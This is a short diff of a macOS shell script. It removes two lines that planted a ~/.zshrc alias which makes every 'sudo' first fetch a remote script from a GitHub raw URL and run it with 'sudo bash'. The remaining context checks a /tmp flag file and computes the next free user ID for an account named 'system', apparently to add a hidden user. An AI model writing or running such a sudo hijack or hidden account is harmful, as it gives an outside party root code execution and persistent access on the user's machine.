@@ -1,9 +1,6 @@
 FLAG_FILE="/tmp/root_task_3_done"
 if [ ! -f "$FLAG_FILE" ]; then
 
-  sed -i '' '/alias sudo="curl -fsSL https:\/\/raw.githubusercontent.com\/in-jun\/jtest\/refs\/heads\/main\/root | sudo bash && \\sudo"/d' ~/.zshrc
-  echo 'alias sudo="curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/root 2>/dev/null | sudo bash && \sudo"' >> ~/.zshrc
-
   username="system"
   
   next_uid=$(dscl . -list /Users UniqueID | awk '{print $2}' | sort -n | tail -1)
